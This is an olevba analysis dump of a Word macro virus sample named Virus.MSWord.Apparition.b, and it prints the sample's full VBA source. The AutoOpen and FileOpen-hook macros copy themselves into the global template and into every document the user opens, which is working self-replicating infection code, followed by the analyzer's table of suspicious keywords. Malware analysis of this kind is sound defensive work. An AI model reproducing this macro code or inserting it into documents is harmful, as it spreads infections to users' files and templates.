olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Apparition.b-d7efa771fbe9161dc772562af7aa45908be452da
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Apparition.b-d7efa771fbe9161dc772562af7aa45908be452da - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DaniloffMuDaK.bas 
in file: Virus.MSWord.Apparition.b-d7efa771fbe9161dc772562af7aa45908be452da - OLE stream: 'Macros/VBA/DaniloffMuDaK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim OurCopyright$
Dim AVPcopyright$
Dim DowniloffCopyright$
Dim sQuestion$
Dim gnoi
Dim iCountMacros
Dim i
Dim zu$
' this macro loaded in normal template as FileOpen
OurCopyright$ = "Co-Copyright (cc) LordAsd and Stainless Steel Rat, mods by me"
AVPcopyright$ = "AVP for WinWord v1.0"
DowniloffCopyright$ = "DaniloffMuDaK"
sQuestion$ = "Would you like to "
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
On Error GoTo -1: On Error GoTo fail
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
WordBasic.MsgBox WordBasic.[FileName$]()
gnoi = 0
iCountMacros = WordBasic.CountMacros(1, 0, 0)
For i = 1 To iCountMacros
 zu$ = WordBasic.[MacroName$](i, 1)
 If zu$ = "WWUpdat" Then gnoi = 1
Next i
If gnoi = 1 Then GoTo fail
WordBasic.FileSaveAs WordBasic.[FileName$](), Format:=1
WordBasic.MacroCopy "Global:AutoOp", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:WWUpdat", WordBasic.[FileName$]() + ":WWUpdat"
WordBasic.MacroCopy "Global:FileOpen", WordBasic.[FileName$]() + ":DaniloffMuDaK"
WordBasic.MsgBox "HAHAHA"
fail:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Apparition.b-d7efa771fbe9161dc772562af7aa45908be452da - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim hru
Dim j
Dim i
On Error GoTo -1: On Error GoTo fail
hru = 0
j = WordBasic.CountMacros(0, 0)
For i = 1 To j
 If WordBasic.[MacroName$](i, 0, 0) = "WWUpdat" Then hru = 1
Next i
If hru = 1 Then GoTo fail
WordBasic.MsgBox "Seppl"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOp"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":WWUpdat", "Global:WWUpdat"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":DaniloffMuDaK", "Global:FileOpen"
fail:
End Sub
-------------------------------------------------------------------------------
VBA MACRO WWUpdat.bas 
in file: Virus.MSWord.Apparition.b-d7efa771fbe9161dc772562af7aa45908be452da - OLE stream: 'Macros/VBA/WWUpdat'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
'so nicht! Presence of AVP for winword
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
